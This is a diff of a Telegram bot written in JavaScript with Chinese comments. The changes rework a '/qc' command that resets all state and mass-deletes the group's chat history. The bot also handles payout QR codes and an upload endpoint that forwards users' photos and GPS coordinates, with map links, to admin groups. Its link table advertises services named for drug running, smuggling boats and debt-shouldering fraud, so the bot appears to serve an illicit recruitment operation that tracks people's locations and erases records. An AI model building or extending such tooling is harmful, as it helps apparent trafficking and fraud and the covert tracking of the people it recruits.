@@ -149,9 +149,9 @@ const zlMessages = new Map();
 // === 功能性数据 (Excel / 支付) ===
 const tpSessions = {}; // Excel 预览缓存
 const pendingAgentAuth = new Map(); // 等待授权中介
-// 1. 等待用户上传收款码: { userId: { amount, adminName, adminId, chatId, targetUser } }
+// 1. 等待用户上传收款码
 const pendingPayouts = new Map();
-// 2. 等待管理员回传截图/驳回: Map key 是 "通知群的消息ID"
+// 2. 等待管理员回传截图/驳回
 const activePayoutMessages = new Map();
 
 const ZL_LINKS = { '租车': 'https://che88.netlify.app', '大飞': 'https://fei88.netlify.app', '走药': 'https://yao88.netlify.app', '背债': 'https://bei88.netlify.app' };
@@ -209,7 +209,7 @@ function saveAuth() {
 }
 loadAuth();
 
-// === 核心：一键重置函数 (已修改：彻底清除所有数据，不保留任何残留) ===
+// === 核心：一键重置函数 (彻底清除所有数据) ===
 function factoryReset() {
     console.log('🔥 正在执行 /qc 彻底重置...');
 
@@ -223,13 +223,13 @@ function factoryReset() {
     unauthorizedMessages.clear();
     zlMessages.clear();
     
-    // 3. 清空 Excel 预览缓存 (内存大户)
+    // 3. 清空 Excel 预览缓存
     for(let k in tpSessions) delete tpSessions[k];
     
     // 4. 清空支付与授权相关的临时状态
     pendingAgentAuth.clear();
     pendingPayouts.clear();
-    activePayoutMessages.clear(); // 清空正在进行的订单
+    activePayoutMessages.clear(); 
 
     // 5. 物理删除本地文件
     try { 
@@ -542,7 +542,7 @@ bot.on('photo', async (ctx, next) => {
                 msg.reply_to_message.message_id, 
                 null, 
                 msg.reply_to_message.caption + `\n\n✅ <b>已由管理员发送截图结单</b>`, 
-                { parse_mode: 'HTML' } // 不传 reply_markup 即可删除按钮
+                { parse_mode: 'HTML' } 
             );
             
             await ctx.reply("✅ 已通知用户并结单。");
@@ -679,7 +679,6 @@ bot.command('tp', async (ctx) => {
         
         const jsonData = xlsx.utils.sheet_to_json(worksheet, { header: 1 });
 
-        // 注意：不再有 expire 自动删除，只靠 /qc 清理
         tpSessions[adminId] = {
             rawData: jsonData,
             mode: 'short', 
@@ -818,37 +817,50 @@ bot.command('qc', async (ctx) => {
     });
 });
 
+// === 🔥 核心修改：防崩溃 + 进度通知版 /qc ===
 bot.action('qc_yes', async (ctx) => {
     if (!await isAdmin(ctx.chat.id, ctx.from.id)) return;
     const chatId = ctx.chat.id;
-    const startId = ctx.callbackQuery.message.message_id;
+    const messageId = ctx.callbackQuery.message.message_id;
 
-    try { await ctx.answerCbQuery(); } catch(e) {}
-    try { await ctx.deleteMessage(); } catch(e) {}
+    // 1. 抢答 (防止按钮一直转圈)
+    try { await ctx.answerCbQuery("🚀 指令已接收，正在后台重置...", { show_alert: false }); } catch(e) {}
 
-    // 1. 调用彻底清理函数
+    // 2. 更新 UI 状态
+    try {
+        await ctx.editMessageText(
+            "⚙️ <b>正在执行出厂设置...</b>\n\n" +
+            "✅ 内存数据已清空\n" +
+            "⏳ 正在后台删除历史消息（请勿操作，稍等片刻）...", 
+            { parse_mode: 'HTML' }
+        );
+    } catch(e) { try { await ctx.reply("⏳ 正在后台重置中..."); } catch(e){} }
+
+    // 3. 执行内存重置
     factoryReset();
 
-    // 2. 暴力删除历史消息 (保留循环逻辑)
+    // 4. 后台异步删消息 (防卡死)
     (async () => {
         let i = 1;
         let consecutiveFails = 0;
-
         while (i <= 1000 && consecutiveFails < 20) {
             try {
-                await new Promise(r => setTimeout(r, 40));
-                await bot.telegram.deleteMessage(chatId, startId - i);
+                await new Promise(r => setTimeout(r, 35)); // 延迟防风控
+                await bot.telegram.deleteMessage(chatId, messageId - i);
                 consecutiveFails = 0;
             } catch (e) {
                 consecutiveFails++;
-                if (e.description && e.description.includes('message can\'t be deleted')) {
-                    break;
-                }
+                if (e.description && e.description.includes('message can\'t be deleted')) break; 
             }
             i++;
         }
 
-        await bot.telegram.sendMessage(chatId, t(chatId, 'qc_done'));
+        // 5. 完成通知
+        try {
+            await bot.telegram.editMessageText(chatId, messageId, null, t(chatId, 'qc_done'));
+        } catch (e) {
+            try { await bot.telegram.sendMessage(chatId, t(chatId, 'qc_done')); } catch(e){}
+        }
     })();
 });
 
@@ -1141,12 +1153,12 @@ expressApp.post('/upload', async (req, res) => {
 
     const userLink = (uid && uid !== '0') ? `<a href="tg://user?id=${uid}">${name}</a>` : name;
 
-   const caption = `<b>[${t(chatid, 'upload_title')}]</b>\n` +
+    const caption = `<b>[${t(chatid, 'upload_title')}]</b>\n` +
                     `👤用户: ${userLink} (ID:${uid})\n` +
                     `⏰时间: ${new Date().toLocaleString('zh-CN', { timeZone: 'Asia/Shanghai' })}\n` +
                     `📍经纬度: ${locText}\n` +
                     `🗺️地图: <a href="https://amap.com/dir?destination=${lng},${lat}">${map1}</a> | <a href="https://www.google.com/maps/search/?api=1&query=${lat},${lng}">${map2}</a>`;
-    
+
     if (GROUP_CHAT_IDS.includes(Number(chatid))) {
       await sendToChat(Number(chatid), photoBuffer, caption, lat, lng);
     }
